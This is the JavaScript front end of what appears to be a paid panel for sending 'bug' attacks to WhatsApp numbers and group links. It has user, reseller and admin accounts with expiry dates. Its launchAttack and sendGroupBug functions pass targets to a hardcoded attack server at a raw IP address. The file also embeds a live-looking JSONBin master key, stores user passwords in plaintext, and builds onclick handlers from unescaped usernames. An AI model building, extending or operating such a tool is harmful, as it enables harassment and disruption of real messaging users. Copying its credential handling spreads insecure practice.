// JSONBin configuration
const BIN_ID = "688384cdae596e708fbb97e4";
const API_KEY = "$2a$10$55IAjRl7i3QlilxdTPmqx.5/Idiemz453V9zHKc76Z9q4jDPhvL.C";
const headers = {
  "Content-Type": "application/json",
  "X-Master-Key": API_KEY
};

// Attack API configuration
const STATUS_API_URL = "http://178.128.24.51:2001/status";
const ATTACK_API_URL = "http://178.128.24.51:2001/UltraXwebAPI";

// Global variables
let currentUser = null;
let localDeviceId = localStorage.getItem('device_id');
if (!localDeviceId) {
  localDeviceId = generateDeviceId();
  localStorage.setItem('device_id', localDeviceId);
}

// DOM elements
const header = document.getElementById('header');
const hamburger = document.getElementById('hamburger');
const sideMenu = document.getElementById('sideMenu');
const menuOverlay = document.getElementById('menuOverlay');
const loginCard = document.getElementById('loginCard');
const dashboard = document.getElementById('dashboard');
// Handle mobile taps for action menu
document.addEventListener('click', function(event) {
  // Close all other action menus when clicking anywhere
  if (!event.target.closest('.action-menu')) {
    document.querySelectorAll('.action-menu-content').forEach(menu => {
      menu.style.display = 'none';
    });
  }
  
  // Toggle action menu when clicking the cog button
  if (event.target.closest('.action-btn') || event.target.closest('.action-btn i')) {
    const menu = event.target.closest('.action-menu').querySelector('.action-menu-content');
    const isVisible = menu.style.display === 'block';
    
    // Close all other menus first
    document.querySelectorAll('.action-menu-content').forEach(m => {
      m.style.display = 'none';
    });
    
    // Toggle this menu
    menu.style.display = isVisible ? 'none' : 'block';
    event.stopPropagation();
  }
});
// Initialize
document.addEventListener('DOMContentLoaded', () => {
  // Check if user is already logged in
  const user = JSON.parse(localStorage.getItem('currentUser'));
  if (user) {
    currentUser = user;
    showDashboard();
  }

  // Hamburger menu click event
  hamburger.addEventListener('click', toggleMenu);
  menuOverlay.addEventListener('click', toggleMenu);
  
  // Check API connection status
  checkApiConnection();
});

// Generate device ID
function generateDeviceId() {
  return Math.random().toString(36).substring(2, 15);
}

// Toggle Target Field
function toggleTargetField() {
  const targetType = document.getElementById('targetType').value;
  document.getElementById('phoneNumberGroup').classList.toggle('hidden', targetType !== 'phone');
  document.getElementById('whatsappGroup').classList.toggle('hidden', targetType !== 'whatsapp');
} 

// Toggle password visibility
function togglePassword(inputId) {
  const input = document.getElementById(inputId);
  const icon = input.nextElementSibling.querySelector('i');
  
  if (input.type === 'password') {
    input.type = 'text';
    icon.classList.replace('fa-eye', 'fa-eye-slash');
  } else {
    input.type = 'password';
    icon.classList.replace('fa-eye-slash', 'fa-eye');
  }
}

// Toggle side menu
function toggleMenu() {
  sideMenu.classList.toggle('active');
  menuOverlay.classList.toggle('active');
}

// Hide all menu cards
function hideAllMenus() {
  document.querySelectorAll('.card').forEach(card => {
    if (!card.id.includes('loginCard') && !card.id.includes('dashboard')) {
      card.classList.add('hidden');
    }
  });
  toggleMenu();
}

// Show specific menu card
function showMenu(menuId) {
  hideAllMenus();
  document.getElementById(menuId).classList.remove('hidden');
  
  if (menuId === 'adminListUsers') {
    loadUserList();
  }
}

// Check API connection status
async function checkApiConnection() {
  try {
    const response = await fetch(STATUS_API_URL);
    const statusElement = document.getElementById('apiStatus');
    
    if (statusElement) {
      if (response.ok) {
        const data = await response.json();
        statusElement.className = 'status-connected';
        statusElement.innerHTML = `<i class="fas fa-check-circle"></i> Connected (${data.status || 'Operational'})`;
        return true;
      } else {
        statusElement.className = 'status-disconnected';
        statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Disconnected';
        return false;
      }
    }
    return response.ok;
  } catch (error) {
    console.error('API connection check failed:', error);
    const statusElement = document.getElementById('apiStatus');
    if (statusElement) {
      statusElement.className = 'status-disconnected';
      statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Connection Failed';
    }
    return false;
  }
}

// Update side menu based on user role
function updateSideMenu() {
  sideMenu.innerHTML = '';
  
  if (!currentUser) return;

  // Common menu items
  const menuItems = [];
  
  menuItems.push(
    { icon: 'fa-user', text: 'My Info', action: () => showMenu('myInfo') },
    { icon: 'fa-bug', text: 'Attack Menu', action: () => showMenu('attackMenu') }
  );

  if (currentUser.role === 'admin') {
    menuItems.push(
      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
      { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
    );
  } else if (currentUser.role === 'reseller') {
    menuItems.push(
      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') }
    );
  }

  // Add API status indicator
  const statusItem = document.createElement('div');
  statusItem.className = 'menu-item';
  statusItem.innerHTML = '<i class="fas fa-plug"></i> <span id="apiStatus">Checking API...</span>';
  sideMenu.appendChild(statusItem);

  // Add menu items to side menu
  menuItems.forEach(item => {
    const menuItem = document.createElement('div');
    menuItem.className = 'menu-item';
    menuItem.innerHTML = `<i class="fas ${item.icon}"></i> ${item.text}`;
    menuItem.addEventListener('click', item.action);
    sideMenu.appendChild(menuItem);
  });

  // Add logout button
  const logoutItem = document.createElement('div');
  logoutItem.className = 'menu-item';
  logoutItem.innerHTML = '<i class="fas fa-sign-out-alt"></i> Logout';
  logoutItem.addEventListener('click', logout);
  logoutItem.style.marginTop = '20px';
  logoutItem.style.color = '#f44336';
  sideMenu.appendChild(logoutItem);
}

// Get users from JSONBin
async function getUsers() {
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
    const data = await response.json();
    return data.record;
  } catch (error) {
    console.error('Error fetching users:', error);
    return [];
  }
}

// Update users in JSONBin
async function updateUsers(users) {
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
      method: 'PUT',
      headers,
      body: JSON.stringify(users)
    });
    return await response.json();
  } catch (error) {
    console.error('Error updating users:', error);
    return null;
  }
}

// Login function
async function login() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const loginResult = document.getElementById('loginResult');
  const loginBtn = document.getElementById('loginBtn');

  // Clear previous messages
  loginResult.innerHTML = '';
  loginResult.style.color = '';

  // Validate inputs
  if (!username || !password) {
    showError(loginResult, 'Please enter both username and password');
    return;
  }

  // Set loading state
  setButtonLoading(loginBtn, true);

  try {
    const users = await getUsers();
    const user = users.find(u => u.username === username && u.password === password);

    if (!user) {
      showError(loginResult, 'Invalid username or password');
      return;
    }

    // Check if account is already in use
    if (user.device_id && user.device_id !== localDeviceId) {
      showError(loginResult, `Account is active on another device (ID: ${user.device_id})`);
      return;
    }

    // Check account expiration (for non-admin users)
    if (user.role !== 'admin' && user.expired) {
      const today = new Date();
      const expiryDate = new Date(user.expired);
      if (expiryDate < today) {
        showError(loginResult, `Account expired on ${user.expired}. Please renew.`);
        return;
      }
    }

    // Update user data
    const updatedUser = {
      ...user,
      device_id: localDeviceId,
    };

    // Update in API
    const updatedUsers = users.map(u => u.username === username ? updatedUser : u);
    await updateUsers(updatedUsers);

    // Store locally and show dashboard
    currentUser = updatedUser;
    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
    
    showSuccess(loginResult, `Welcome back, ${username}!`);
    setTimeout(showDashboard, 1000);

  } catch (error) {
    console.error('Login error:', error);
    showError(loginResult, `System error: ${error.message || 'Please try again later'}`);
  } finally {
    setButtonLoading(loginBtn, false);
  }
}

// Helper functions
function showError(element, message) {
  element.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
  element.style.color = '#f44336';
}

function showSuccess(element, message) {
  element.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
  element.style.color = 'var(--main)';
}

function setButtonLoading(button, isLoading) {
  button.innerHTML = isLoading 
    ? '<i class="fas fa-spinner fa-spin"></i> Processing...' 
    : '<i class="fas fa-sign-in-alt"></i> Login';
  button.disabled = isLoading;
}

// Show dashboard
function showDashboard() {
  header.classList.remove('hidden');
  loginCard.classList.add('hidden');
  dashboard.classList.remove('hidden');
  
  document.getElementById('infoUsername').textContent = currentUser.username;
  document.getElementById('infoRole').textContent = currentUser.role;
  document.getElementById('infoDeviceId').textContent = localDeviceId;
  document.getElementById('infoExpired').textContent = currentUser.expired || 'N/A';
  
  document.getElementById('myInfoUsername').value = currentUser.username;
  document.getElementById('myInfoRole').value = currentUser.role;
  
  updateSideMenu();
}

// Logout function
async function logout() {
  try {
    if (currentUser) {
      const users = await getUsers();
      const updatedUsers = users.map(u => {
        if (u.username === currentUser.username) {
          return { ...u, device_id: '' };
        }
        return u;
      });
      await updateUsers(updatedUsers);
    }
  } catch (error) {
    console.error('Error during logout:', error);
  } finally {
    currentUser = null;
    localStorage.removeItem('currentUser');
    header.classList.add('hidden');
    loginCard.classList.remove('hidden');
    dashboard.classList.add('hidden');
    hideAllMenus();
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
  }
}

// Reset password
async function resetPassword() {
  const newPassword = document.getElementById('newPassword').value;
  const resetPassBtn = document.getElementById('resetPassBtn');
  const myInfoResult = document.getElementById('myInfoResult');

  if (!newPassword) {
    myInfoResult.innerHTML = 'Please enter new password';
    myInfoResult.style.color = '#f44336';
    return;
  }

  resetPassBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Updating...';
  resetPassBtn.disabled = true;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => {
      if (u.username === currentUser.username) {
        return { ...u, password: newPassword };
      }
      return u;
    });

    await updateUsers(updatedUsers);

    currentUser.password = newPassword;
    localStorage.setItem('currentUser', JSON.stringify(currentUser));

    myInfoResult.innerHTML = 'Password updated successfully';
    myInfoResult.style.color = 'var(--main)';
    document.getElementById('newPassword').value = '';
  } catch (error) {
    myInfoResult.innerHTML = 'Error updating password: ' + error.message;
    myInfoResult.style.color = '#f44336';
  } finally {
    resetPassBtn.innerHTML = '<i class="fas fa-key"></i> Reset Password';
    resetPassBtn.disabled = false;
  }
}

// Launch attack
async function launchAttack() {
  const targetNumber = document.getElementById('targetNumber').value.trim();
  const bugType = document.getElementById('bugType').value;
  const attackBtn = document.getElementById('attackBtn');
  const attackResult = document.getElementById('attackResult');

  if (!targetNumber) {
    attackResult.innerHTML = 'Please enter target number';
    attackResult.style.color = '#f44336';
    return;
  }

  attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
  attackBtn.disabled = true;

  try {
    const isConnected = await checkApiConnection();
    if (!isConnected) {
      attackResult.innerHTML = 'API is currently unavailable';
      attackResult.style.color = '#f44336';
      return;
    }

    const response = await fetch(`${ATTACK_API_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
    
    if (!response.ok) {
      throw new Error("Failed to connect to attack server");
    }

    const result = await response.json();
    
    if (result.success) {
      attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
      attackResult.style.color = 'var(--main)';
    } else {
      attackResult.innerHTML = result.message || 'Attack failed';
      attackResult.style.color = '#f44336';
    }
  } catch (error) {
    attackResult.innerHTML = 'Attack failed: ' + error.message;
    attackResult.style.color = '#f44336';
  } finally {
    attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
    attackBtn.disabled = false;
  }
}

// Create new user (admin only)
async function createUser() {
  const username = document.getElementById('newUsername').value;
  const password = document.getElementById('newUserPassword').value;
  const role = document.getElementById('newUserRole').value;
  const days = parseInt(document.getElementById('newUserDays').value);
  const createUserBtn = document.getElementById('createUserBtn');
  const createUserResult = document.getElementById('createUserResult');

  if (!username || !password || isNaN(days)) {
    createUserResult.innerHTML = 'Please fill all fields correctly';
    createUserResult.style.color = '#f44336';
    return;
  }

  // Reseller can only create user accounts with max 30 days
  if (currentUser.role === 'reseller' && (role !== 'user' || days > 30)) {
    createUserResult.innerHTML = 'Resellers can only create user accounts with max 30 days';
    createUserResult.style.color = '#f44336';
    return;
  }

  createUserBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Creating...';
  createUserBtn.disabled = true;

  try {
    const users = await getUsers();
    
    if (users.some(u => u.username === username)) {
      createUserResult.innerHTML = 'Username already exists';
      createUserResult.style.color = '#f44336';
      return;
    }

    const expiredDate = new Date();
    expiredDate.setDate(expiredDate.getDate() + days);

    const newUser = {
      username,
      password,
      role,
      telegram_id: null,
      device_id: '',
      expired: expiredDate.toISOString().split('T')[0]
    };

    const updatedUsers = [...users, newUser];
    await updateUsers(updatedUsers);

    createUserResult.innerHTML = `User ${username} created successfully`;
    createUserResult.style.color = 'var(--main)';
    
    document.getElementById('newUsername').value = '';
    document.getElementById('newUserPassword').value = '';
    document.getElementById('newUserDays').value = '30';
  } catch (error) {
    createUserResult.innerHTML = 'Error creating user: ' + error.message;
    createUserResult.style.color = '#f44336';
  } finally {
    createUserBtn.innerHTML = '<i class="fas fa-save"></i> Create User';
    createUserBtn.disabled = false;
  }
}

// Delete user (admin only)
async function deleteUser(username) {
  if (!confirm(`Are you sure you want to delete user ${username}?`)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.filter(u => u.username !== username);
    await updateUsers(updatedUsers);
    
    if (currentUser.username === username) {
      logout();
    } else {
      loadUserList();
    }
  } catch (error) {
    console.error('Error deleting user:', error);
    alert('Failed to delete user');
  }
}

// User management functions
async function addDaysToUser(username) {
  const days = prompt('Enter number of days to add:', '30');
  if (!days || isNaN(days)) return;

  try {
    const users = await getUsers();
    const user = users.find(u => u.username === username);
    if (!user) return;

    const expiredDate = new Date(user.expired || new Date());
    expiredDate.setDate(expiredDate.getDate() + parseInt(days));

    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, expired: expiredDate.toISOString().split('T')[0] } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    alert(`Added ${days} days to ${username}`);
  } catch (error) {
    console.error('Error adding days:', error);
    alert('Failed to add days');
  }
}

async function changeUserRole(username) {
  const role = prompt('Enter new role (admin/reseller/user):', 'user');
  if (!role || !['admin', 'reseller', 'user'].includes(role)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, role } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    alert(`Changed role for ${username} to ${role}`);
  } catch (error) {
    console.error('Error changing role:', error);
    alert('Failed to change role');
  }
}

async function changeUsername(oldUsername) {
  const newUsername = prompt('Enter new username:', oldUsername);
  if (!newUsername || newUsername === oldUsername) return;

  try {
    const users = await getUsers();
    if (users.some(u => u.username === newUsername)) {
      alert('Username already exists');
      return;
    }

    const updatedUsers = users.map(u => 
      u.username === oldUsername ? { ...u, username: newUsername } : u
    );

    await updateUsers(updatedUsers);
    
    // Update current user if it's them
    if (currentUser.username === oldUsername) {
      currentUser.username = newUsername;
      localStorage.setItem('currentUser', JSON.stringify(currentUser));
      document.getElementById('infoUsername').textContent = newUsername;
    }
    
    loadUserList();
    alert(`Username changed from ${oldUsername} to ${newUsername}`);
  } catch (error) {
    console.error('Error changing username:', error);
    alert('Failed to change username');
  }
}

async function changeUserPassword(username) {
  const newPassword = prompt('Enter new password:');
  if (!newPassword) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, password: newPassword } : u
    );

    await updateUsers(updatedUsers);
    alert(`Password changed for ${username}`);
  } catch (error) {
    console.error('Error changing password:', error);
    alert('Failed to change password');
  }
}

async function resetDeviceId(username) {
  if (!confirm(`Reset device ID for ${username}? This will log them out.`)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, device_id: '' } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    alert(`Device ID reset for ${username}`);
  } catch (error) {
    console.error('Error resetting device ID:', error);
    alert('Failed to reset device ID');
  }
}

// Update the loadUserList function to include all actions
async function loadUserList() {
  const userListBody = document.getElementById('userListBody');
  userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Loading users...</td></tr>';

  try {
    const users = await getUsers();
    
    if (users.length === 0) {
      userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No users found</td></tr>';
      return;
    }

    userListBody.innerHTML = '';
    users.forEach(user => {
      const row = document.createElement('tr');
      
      let actions = '';
      if (currentUser.role === 'admin' && user.username !== currentUser.username) {
        actions = `
          <div class="action-menu">
            <button class="action-btn">
              <i class="fas fa-cog"></i>
            </button>
            <div class="action-menu-content">
              <a href="#" onclick="addDaysToUser('${user.username}'); return false;">
                <i class="fas fa-calendar-plus"></i> Add Days
              </a>
              <a href="#" onclick="changeUserRole('${user.username}'); return false;">
                <i class="fas fa-user-tag"></i> Change Role
              </a>
              <a href="#" onclick="changeUsername('${user.username}'); return false;">
                <i class="fas fa-user-edit"></i> Change Username
              </a>
              <a href="#" onclick="changeUserPassword('${user.username}'); return false;">
                <i class="fas fa-key"></i> Change Password
              </a>
              <a href="#" onclick="resetDeviceId('${user.username}'); return false;">
                <i class="fas fa-mobile-alt"></i> Reset Device ID
              </a>
              <a href="#" onclick="deleteUser('${user.username}'); return false;" style="color: #f44336;">
                <i class="fas fa-trash"></i> Delete User
              </a>
            </div>
          </div>
        `;
      }
      
      row.innerHTML = `
        <td>${user.username}</td>
        <td>${user.role}</td>
        <td>${user.expired || 'N/A'}</td>
        <td>${user.device_id || 'Not logged in'}</td>
        <td>${actions}</td>
      `;
      userListBody.appendChild(row);
    });
  } catch (error) {
    userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #f44336;">Error loading users</td></tr>';
  }
}

// Switch between attack tabs
function switchAttackTab(tabName) {
  // Update tab buttons
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.classList.toggle('active', btn.textContent.toLowerCase().includes(tabName));
  });
  
  // Update content sections
  document.getElementById('numberTarget').classList.toggle('hidden', tabName !== 'number');
  document.getElementById('whatsappTarget').classList.toggle('hidden', tabName !== 'whatsapp');
  
  // Clear previous results
  document.getElementById('attackResult').innerHTML = '';
}

// Enhanced sendGroupBug function
async function sendGroupBug() {
  const groupLink = document.getElementById('whatsappGroup').value.trim();
  const bugType = document.getElementById('whatsappBugType').value;
  const attackBtn = document.getElementById('whatsappAttackBtn');
  const resultElement = document.getElementById('attackResult');

  if (!groupLink) {
    showError(resultElement, 'Please enter WhatsApp group link');
    return;
  }

  attackBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
  attackBtn.disabled = true;

  try {
    const isConnected = await checkApiConnection();
    if (!isConnected) {
      showError(resultElement, 'API is currently unavailable');
      return;
    }

    const response = await fetch(`${ATTACK_API_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}`);
    
    if (!response.ok) {
      throw new Error(await response.text() || "Failed to connect to server");
    }

    const result = await response.json();
    if (result.success) {
      showSuccess(resultElement, `Bug successfully sent to WhatsApp group!`);
    } else {
      showError(resultElement, result.message || 'Failed to send bug');
    }
  } catch (error) {
    showError(resultElement, `Error: ${error.message}`);
  } finally {
    attackBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Group Bug';
    attackBtn.disabled = false;
  }
}

// Initialize attack menu when shown
document.getElementById('attackMenu').addEventListener('show', async () => {
  await checkApiConnection();
});

function switchAttackType(type) {
  const phoneSection = document.getElementById('phoneAttackSection');
  const whatsappSection = document.getElementById('whatsappAttackSection');
  
  if (type === 'phone') {
    phoneSection.classList.remove('hidden');
    whatsappSection.classList.add('hidden');
  } else {
    phoneSection.classList.add('hidden');
    whatsappSection.classList.remove('hidden');
  }
  
  // Clear previous results
  document.getElementById('attackResult').innerHTML = '';
  checkApiConnection();
}